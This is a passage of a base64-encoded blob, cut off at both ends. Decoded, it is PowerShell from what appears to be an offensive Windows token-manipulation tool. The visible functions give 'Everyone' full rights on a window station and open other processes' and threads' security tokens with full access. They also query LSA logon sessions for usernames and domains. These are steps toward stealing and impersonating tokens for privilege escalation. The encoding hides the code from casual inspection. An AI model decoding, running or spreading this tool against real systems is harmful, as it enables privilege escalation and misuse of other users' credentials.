sU2l6ZSkKICAgICAgICAgICAgaWYgKC1ub3QgJFN1Y2Nlc3MpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93IChOZXctT2JqZWN0IENvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uKQogICAgICAgICAgICB9CgogICAgICAgICAgICAjRm9yIHVzZXIgIkV2ZXJ5b25lIgogICAgICAgICAgICAkVHJ1c3RlZVNpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFRSVVNURUUpCiAgICAgICAgICAgICRUcnVzdGVlUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRUcnVzdGVlU2l6ZSkKICAgICAgICAgICAgJFRydXN0ZWVPYmogPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkVHJ1c3RlZVB0ciwgW1R5cGVdJFRSVVNURUUpCiAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCRUcnVzdGVlUHRyKQogICAgICAgICAgICAkVHJ1c3RlZU9iai5wTXVsdGlwbGVUcnVzdGVlID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgJFRydXN0ZWVPYmouTXVsdGlwbGVUcnVzdGVlT3BlcmF0aW9uID0gMAogICAgICAgICAgICAkVHJ1c3RlZU9iai5UcnVzdGVlRm9ybSA9ICRXaW4zMkNvbnN0YW50cy5UUlVTVEVFX0lTX1NJRAogICAgICAgICAgICAkVHJ1c3RlZU9iai5UcnVzdGVlVHlwZSA9ICRXaW4zMkNvbnN0YW50cy5UUlVTVEVFX0lTX1dFTExfS05PV05fR1JPVVAKICAgICAgICAgICAgJFRydXN0ZWVPYmoucHRzdHJOYW1lID0gJHBBbGxVc2Vyc1NpZAoKICAgICAgICAgICAgI0dpdmUgZnVsbCBwZXJtaXNzaW9uCiAgICAgICAgICAgICRFeHBsaWNpdEFjY2Vzc1NpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJEVYUExJQ0lUX0FDQ0VTUykKICAgICAgICAgICAgJEV4cGxpY2l0QWNjZXNzUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRFeHBsaWNpdEFjY2Vzc1NpemUpCiAgICAgICAgICAgICRFeHBsaWNpdEFjY2VzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRFeHBsaWNpdEFjY2Vzc1B0ciwgW1R5cGVdJEVYUExJQ0lUX0FDQ0VTUykKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6RnJlZUhHbG9iYWwoJEV4cGxpY2l0QWNjZXNzUHRyKQogICAgICAgICAgICAkRXhwbGljaXRBY2Nlc3MuZ3JmQWNjZXNzUGVybWlzc2lvbnMgPSAweGYwM2ZmCiAgICAgICAgICAgICRFeHBsaWNpdEFjY2Vzcy5ncmZBY2Nlc3NNb2RlID0gJFdpbjMyY29uc3RhbnRzLkdSQU5UX0FDQ0VTUwogICAgICAgICAgICAkRXhwbGljaXRBY2Nlc3MuZ3JmSW5oZXJpdGFuY2UgPSAkV2luMzJDb25zdGFudHMuT0JKRUNUX0lOSEVSSVRfQUNFCiAgICAgICAgICAgICRFeHBsaWNpdEFjY2Vzcy5UcnVzdGVlID0gJFRydXN0ZWVPYmoKCiAgICAgICAgICAgIFtJbnRQdHJdJE5ld0RhY2wgPSBbSW50UHRyXTo6WmVybwoKICAgICAgICAgICAgJFJldFZhbCA9ICRTZXRFbnRyaWVzSW5BY2xXLkludm9rZSgxLCBbUmVmXSRFeHBsaWNpdEFjY2VzcywgJHBwRGFjbCwgW1JlZl0kTmV3RGFjbCkKICAgICAgICAgICAgaWYgKCRSZXRWYWwgLW5lIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLUVycm9yICJFcnJvciBjYWxsaW5nIFNldEVudHJpZXNJbkFjbFc6ICRSZXRWYWwiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCRwQWxsVXNlcnNTaWQpCgogICAgICAgICAgICBpZiAoJE5ld0RhY2wgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0aHJvdyAiTmV3IERBQ0wgaXMgbnVsbCIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgIzB4NyBpcyB3aW5kb3cgc3RhdGlvbiwgY2hhbmdlIGZvciBvdGhlciB0eXBlcwogICAgICAgICAgICAkUmV0VmFsID0gJFNldFNlY3VyaXR5SW5mby5JbnZva2UoJGhPYmplY3QsIDB4NywgJFdpbjMyQ29uc3RhbnRzLkRBQ0xfU0VDVVJJVFlfSU5GT1JNQVRJT04sICRwcFNpZE93bmVyLCAkcHBTaWRHcm91cCwgJE5ld0RhY2wsICRwcFNhY2wpCiAgICAgICAgICAgIGlmICgkUmV0VmFsIC1uZSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1FcnJvciAiU2V0U2VjdXJpdHlJbmZvIGZhaWxlZC4gUmV0dXJuIHZhbHVlOiAkUmV0VmFsIgogICAgICAgICAgICB9CgogICAgICAgICAgICAkTG9jYWxGcmVlLkludm9rZSgkcHBTZWN1cml0eURlc2NyaXB0b3IpIHwgT3V0LU51bGwKICAgICAgICB9CiAgICB9CgoKICAgICNHZXQgdGhlIHByaW1hcnkgdG9rZW4gZm9yIHRoZSBzcGVjaWZpZWQgcHJvY2Vzc0lkCiAgICBmdW5jdGlvbiBHZXQtUHJpbWFyeVRva2VuCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICAgICAgW1VJbnQzMl0KICAgICAgICAgICAgJFByb2Nlc3NJZCwKCiAgICAgICAgICAgICNPcGVuIHRoZSB0b2tlbiB3aXRoIGFsbCBwcml2aWxlZ2VzLiBSZXF1aXJlcyBTWVNURU0gYmVjYXVzZSBzb21lIG9mIHRoZSBwcml2aWxlZ2VzIGFyZSByZXN0cmljdGVkIHRvIFNZU1RFTS4KICAgICAgICAgICAgW1BhcmFtZXRlcigpXQogICAgICAgICAgICBbU3dpdGNoXQogICAgICAgICAgICAkRnVsbFByaXZzCiAgICAgICAgKQoKICAgICAgICBpZiAoJEZ1bGxQcml2cykKICAgICAgICB7CiAgICAgICAgICAgICRUb2tlblByaXZzID0gJFdpbjMyQ29uc3RhbnRzLlRPS0VOX0FMTF9BQ0NFU1MKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJFRva2VuUHJpdnMgPSAkV2luMzJDb25zdGFudHMuVE9LRU5fQVNTSUdOX1BSSU1BUlkgLWJvciAkV2luMzJDb25zdGFudHMuVE9LRU5fRFVQTElDQVRFIC1ib3IgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX0lNUEVSU09OQVRFIC1ib3IgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX1FVRVJZIAogICAgICAgIH0KCiAgICAgICAgJFJldHVyblN0cnVjdCA9IE5ldy1PYmplY3QgUFNPYmplY3QKCiAgICAgICAgJGhQcm9jZXNzID0gJE9wZW5Qcm9jZXNzLkludm9rZSgkV2luMzJDb25zdGFudHMuUFJPQ0VTU19RVUVSWV9JTkZPUk1BVElPTiwgJHRydWUsIFtVSW50MzJdJFByb2Nlc3NJZCkKICAgICAgICAkUmV0dXJuU3RydWN0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgaFByb2Nlc3MgLVZhbHVlICRoUHJvY2VzcwogICAgICAgIGlmICgkaFByb2Nlc3MgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgI0lmIGEgcHJvY2VzcyBpcyBhIHByb3RlY3RlZCBwcm9jZXNzIGl0IGNhbm5vdCBiZSBlbnVtZXJhdGVkLiBUaGlzIGNhbGwgc2hvdWxkIG9ubHkgZmFpbCBmb3IgcHJvdGVjdGVkIHByb2Nlc3Nlcy4KICAgICAgICAgICAgJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIG9wZW4gcHJvY2VzcyBoYW5kbGUgZm9yIFByb2Nlc3NJZDogJFByb2Nlc3NJZC4gUHJvY2Vzc05hbWUgJCgoR2V0LVByb2Nlc3MgLUlkICRQcm9jZXNzSWQpLk5hbWUpLiBFcnJvciBjb2RlOiAkRXJyb3JDb2RlIC4gVGhpcyBpcyBsaWtlbHkgYmVjYXVzZSB0aGlzIGlzIGEgcHJvdGVjdGVkIHByb2Nlc3MuIgogICAgICAgICAgICByZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgW0ludFB0cl0kaFByb2NUb2tlbiA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICRTdWNjZXNzID0gJE9wZW5Qcm9jZXNzVG9rZW4uSW52b2tlKCRoUHJvY2VzcywgJFRva2VuUHJpdnMsIFtSZWZdJGhQcm9jVG9rZW4pCgogICAgICAgICAgICAjQ2xvc2UgdGhlIGhhbmRsZSB0byBoUHJvY2VzcyAodGhlIHByb2Nlc3MgaGFuZGxlKQogICAgICAgICAgICBpZiAoLW5vdCAkQ2xvc2VIYW5kbGUuSW52b2tlKCRoUHJvY2VzcykpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJGYWlsZWQgdG8gY2xvc2UgcHJvY2VzcyBoYW5kbGUsIHRoaXMgaXMgdW5leHBlY3RlZC4gRXJyb3JDb2RlOiAkRXJyb3JDb2RlIgogICAgICAgICAgICB9CiAgICAgICAgICAgICRoUHJvY2VzcyA9IFtJbnRQdHJdOjpaZXJvCgogICAgICAgICAgICBpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSAtb3IgJGhQcm9jVG9rZW4gLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiRmFpbGVkIHRvIGdldCBwcm9jZXNzZXMgcHJpbWFyeSB0b2tlbi4gUHJvY2Vzc0lkOiAkUHJvY2Vzc0lkLiBQcm9jZXNzTmFtZSAkKChHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJZCkuTmFtZSkuIEVycm9yOiAkRXJyb3JDb2RlIgogICAgICAgICAgICAgICAgcmV0dXJuICRudWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUmV0dXJuU3RydWN0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgaFByb2NUb2tlbiAtVmFsdWUgJGhQcm9jVG9rZW4KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRSZXR1cm5TdHJ1Y3QKICAgIH0KCgogICAgZnVuY3Rpb24gR2V0LVRocmVhZFRva2VuCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICAgICAgW1VJbnQzMl0KICAgICAgICAgICAgJFRocmVhZElkCiAgICAgICAgKQoKICAgICAgICAkVG9rZW5Qcml2cyA9ICRXaW4zMkNvbnN0YW50cy5UT0tFTl9BTExfQUNDRVNTCgogICAgICAgICRSZXRTdHJ1Y3QgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgW0ludFB0cl0kaFRocmVhZFRva2VuID0gW0ludFB0cl06Olplcm8KCiAgICAgICAgJGhUaHJlYWQgPSAkT3BlblRocmVhZC5JbnZva2UoJFdpbjMyQ29uc3RhbnRzLlRIUkVBRF9BTExfQUNDRVNTLCAkZmFsc2UsICRUaHJlYWRJZCkKICAgICAgICBpZiAoJGhUaHJlYWQgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgaWYgKCRFcnJvckNvZGUgLW5lICRXaW4zMkNvbnN0YW50cy5FUlJPUl9JTlZBTElEX1BBUkFNRVRFUikgI1RoZSB0aHJlYWQgcHJvYmFibHkgbm8gbG9uZ2VyIGV4aXN0cwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJGYWlsZWQgdG8gb3BlbiB0aHJlYWQgaGFuZGxlIGZvciBUaHJlYWRJZDogJFRocmVhZElkLiBFcnJvciBjb2RlOiAkRXJyb3JDb2RlIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRTdWNjZXNzID0gJE9wZW5UaHJlYWRUb2tlbi5JbnZva2UoJGhUaHJlYWQsICRUb2tlblByaXZzLCAkZmFsc2UsIFtSZWZdJGhUaHJlYWRUb2tlbikKICAgICAgICAgICAgaWYgKC1ub3QgJFN1Y2Nlc3MpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgICAgICBpZiAoKCRFcnJvckNvZGUgLW5lICRXaW4zMkNvbnN0YW50cy5FUlJPUl9OT19UT0tFTikgLWFuZCAgI1RoaXMgZXJyb3IgaXMgcmV0dXJuZWQgd2hlbiB0aGUgdGhyZWFkIGlzbid0IGltcGVyc29uYXRlZAogICAgICAgICAgICAgICAgICgkRXJyb3JDb2RlIC1uZSAkV2luMzJDb25zdGFudHMuRVJST1JfSU5WQUxJRF9QQVJBTUVURVIpKSAjUHJvYmFibHkgbWVhbnMgdGhlIHRocmVhZCB3YXMgY2xvc2VkCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiRmFpbGVkIHRvIGNhbGwgT3BlblRocmVhZFRva2VuIGZvciBUaHJlYWRJZDogJFRocmVhZElkLiBFcnJvciBjb2RlOiAkRXJyb3JDb2RlIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU3VjY2Vzc2Z1bGx5IHF1ZXJpZWQgdGhyZWFkIHRva2VuIgogICAgICAgICAgICB9CgogICAgICAgICAgICAjQ2xvc2UgdGhlIGhhbmRsZSB0byBoVGhyZWFkICh0aGUgdGhyZWFkIGhhbmRsZSkKICAgICAgICAgICAgaWYgKC1ub3QgJENsb3NlSGFuZGxlLkludm9rZSgkaFRocmVhZCkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJGYWlsZWQgdG8gY2xvc2UgdGhyZWFkIGhhbmRsZSwgdGhpcyBpcyB1bmV4cGVjdGVkLiBFcnJvckNvZGU6ICRFcnJvckNvZGUiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGhUaHJlYWQgPSBbSW50UHRyXTo6WmVybwogICAgICAgIH0KCiAgICAgICAgJFJldFN0cnVjdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIGhUaHJlYWRUb2tlbiAtVmFsdWUgJGhUaHJlYWRUb2tlbgogICAgICAgIHJldHVybiAkUmV0U3RydWN0CiAgICB9CgoKICAgICNHZXRzIGltcG9ydGFudCBpbmZvcm1hdGlvbiBhYm91dCB0aGUgdG9rZW4gc3VjaCBhcyB0aGUgbG9nb24gdHlwZSBhc3NvY2lhdGVkIHdpdGggdGhlIGxvZ29uCiAgICBmdW5jdGlvbiBHZXQtVG9rZW5JbmZvcm1hdGlvbgogICAgewogICAgICAgIFBhcmFtKAogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgICAgIFtJbnRQdHJdCiAgICAgICAgICAgICRoVG9rZW4KICAgICAgICApCgogICAgICAgICRSZXR1cm5PYmogPSAkbnVsbAoKICAgICAgICAkVG9rZW5TdGF0c1NpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFRPS0VOX1NUQVRJU1RJQ1MpCiAgICAgICAgW0ludFB0cl0kVG9rZW5TdGF0c1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG9rZW5TdGF0c1NpemUpCiAgICAgICAgW1VJbnQzMl0kUmVhbFNpemUgPSAwCiAgICAgICAgJFN1Y2Nlc3MgPSAkR2V0VG9rZW5JbmZvcm1hdGlvbi5JbnZva2UoJGhUb2tlbiwgJFRPS0VOX0lORk9STUFUSU9OX0NMQVNTOjpUb2tlblN0YXRpc3RpY3MsICRUb2tlblN0YXRzUHRyLCAkVG9rZW5TdGF0c1NpemUsIFtSZWZdJFJlYWxTaXplKQogICAgICAgIGlmICgtbm90ICRTdWNjZXNzKQogICAgICAgIHsKICAgICAgICAgICAgJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiR2V0VG9rZW5JbmZvcm1hdGlvbiBmYWlsZWQuIEVycm9yIGNvZGU6ICRFcnJvckNvZGUiCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRUb2tlblN0YXRzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFRva2VuU3RhdHNQdHIsIFtUeXBlXSRUT0tFTl9TVEFUSVNUSUNTKQoKICAgICAgICAgICAgI1F1ZXJ5IExTQSB0byBkZXRlcm1pbmUgd2hhdCB0aGUgbG9nb250eXBlIG9mIHRoZSBzZXNzaW9uIGlzIHRoYXQgdGhlIHRva2VuIGNvcnJvc3BvbmRzIHRvLCBhcyB3ZWxsIGFzIHRoZSB1c2VybmFtZS9kb21haW4gb2YgdGhlIGxvZ29uCiAgICAgICAgICAgICRMdWlkUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kTFVJRCkpCiAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRUb2tlblN0YXRzLkF1dGhlbnRpY2F0aW9uSWQsICRMdWlkUHRyLCAkZmFsc2UpCgogICAgICAgICAgICBbSW50UHRyXSRMb2dvblNlc3Npb25EYXRhUHRyID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgJFJldHVyblZhbCA9ICRMc2FHZXRMb2dvblNlc3Npb25EYXRhLkludm9rZSgkTHVpZFB0ciwgW1JlZl0kTG9nb25TZXNzaW9uRGF0YVB0cikKICAgICAgICAgICAgaWYgKCRSZXR1cm5WYWwgLW5lIDAgLWFuZCAkTG9nb25TZXNzaW9uRGF0YVB0ciAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkNhbGwgdG8gTHNhR2V0TG9nb25TZXNzaW9uRGF0YSBmYWlsZWQuIEVycm9yIGNvZGU6ICRSZXR1cm5WYWwuIExvZ29uU2Vzc2lvbkRhdGFQdHIgPSAkTG9nb25TZXNzaW9uRGF0YVB0ciIKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRMb2dvblNlc3Npb25EYXRhID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJExvZ29uU2Vzc2lvbkRhdGFQdHIsIFtUeXBlXSRTRUNVUklUWV9MT0dPTl9TRVNTSU9OX0RBVEEpCiAgICAgICAgICAgICAgICBpZiAoJExvZ29uU2Vzc2lvbkRhdGEuVXNlcm5hbWUuQnVmZmVyIC1uZSBbSW50UHRyXTo6WmVybyAtYW5kIAogICAgICAgICAgICAgICAgICAgICRMb2dvblNlc3Npb25EYXRhLkxvZ2luRG9tYWluLkJ1ZmZlciAtbmUgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgI0dldCB0aGUgdXNlcm5hbWUgYW5kIGRvbWFpbm5hbWUgYXNzb2NpYXRlZCB3aXRoIHRoZSB0b2tlbgogICAgICAgICAgICAgICAgICAgICRVc2VybmFtZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nVW5pKCRMb2dvblNlc3Npb25EYXRhLlVzZXJuYW1lLkJ1ZmZlciwgJExvZ29uU2Vzc2lvbkRhdGEuVXNlcm5hbWUuTGVuZ3RoLzIpCiAgICAgICAgICAgICAgICAgICAgJERvbWFpbiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nVW5pKCRMb2dvblNlc3Npb25EYXRhLkxvZ2luRG9tYWluLkJ1ZmZlciwgJExvZ29uU2Vzc2lvbkRhdGEuTG9naW5Eb21haW4uTGVuZ3RoLzIpCgogICAgICAgICAgICAgICAgICAgICNJZiBVc2VyTmFtZSBpcyBmb3IgdGhlIGNvbXB1dGVyIGFjY291bnQsIGZpZ3VyZSBvdXQgd2hhdCBhY2NvdW50IGl0IGFjdHVhbGx5IGlzIChTWVNURU0sIE5FVFdPUksgU0VSVklDRSkKICAgICAgICAgICAgICAgICAgICAjT25seSBkbyB0aGlzIGZvciB0aGUgY29tcHV0ZXIgYWNjb3VudCBiZWNhdXNlIG90aGVyIGFjY291bnRzIHJldHVybiBjb3JyZWN0bHkuIEFsc28sIGRvaW5nIHRoaXMgZm9yIGEgZG9tYWluIGFjY291bnQgCiAgICAgICAgICAgICAgICAgICAgI3Jlc3VsdHMgaW4gcXVlcnlpbmcgdGhlIGRvbWFpbiBjb250cm9sbGVyIHdoaWNoIGlzIHVud2FudGVkLgogICAgICAgICAgICAgICAgICAgIGlmICgkVXNlcm5hbWUgLWllcSAiJCgkZW52OkNPTVBVVEVSTkFNRSlgJCIpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbVUludDMyXSRTaXplID0gMTAwCiAgICAgICAgICAgICAgICAgICAgICAgIFtVSW50MzJdJE51bVVzZXJuYW1lQ2hhciA9ICRTaXplIC8gMgogICAgICAgICAgICAgICAgICAgICAgICBbVUludDMyXSROdW1Eb21haW5DaGFyID0gJFNpemUgLyAyCiAgICAgICAgICAgICAgICAgICAgICAgIFtVSW50MzJdJFNpZE5hbWVVc2UgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VybmFtZUJ1ZmZlciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkU2l6ZSkKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpbkJ1ZmZlciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkU2l6ZSkKICAgICAgICAgICAgICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkTG9va3VwQWNjb3VudFNpZFcuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkTG9nb25TZXNzaW9uRGF0YS5TaWQsICRVc2VybmFtZUJ1ZmZlciwgW1JlZl0kTnVtVXNlcm5hbWVDaGFyLCAkRG9tYWluQnVmZmVyLCBbUmVmXSROdW1Eb21haW5DaGFyLCBbUmVmXSRTaWROYW1lVXNlKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRTdWNjZXNzKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlcm5hbWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ1VuaSgkVXNlcm5hbWVCdWZmZXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdVbmkoJERvbWFpbkJ1ZmZlcikKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJFcnJvciBjYWxsaW5nIExvb2t1cEFjY291bnRTaWRXLiBFcnJvciBjb2RlOiAkRXJyb3JDb2RlIgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkVXNlcm5hbWVCdWZmZXIpCiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VybmFtZUJ1ZmZlciA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCREb21haW5CdWZmZXIpCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5CdWZmZXIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgJFJldHVybk9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkUmV0dXJuT2JqIHwgQWRkLU1lbWJlciAtVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRG9tYWluIC1WYWx1ZSAkRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJFJldHVybk9iaiB8IEFkZC1NZW1iZXIgLVR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFVzZXJuYW1lIC1WYWx1ZSAkVXNlcm5hbWUgICAgCiAgICAgICAgICAgICAgICAgICAgJFJldHVybk9iaiB8IEFkZC1NZW1iZXIgLVR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIGhUb2tlbiAtVmFsdWUgJGhUb2tlbgogICAgICAgICAgICAgICAgICAgICRSZXR1cm5PYmogfCBBZGQtTWVtYmVyIC1UeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBMb2dvblR5cGUgLVZhbHVlICRMb2dvblNlc3Npb25EYXRhLkxvZ29uVHlwZQoKCiAgICAgICAgICAgICAgICAgICAgI1F1ZXJ5IGFkZGl0aW9uYWwgaW5mbyBhYm91dCB0aGUgdG9rZW4gc3VjaCBhcyBpZiBpdCBpcyBlbGV2YXRlZAogICAgICAgICAgICAgICAgICAgI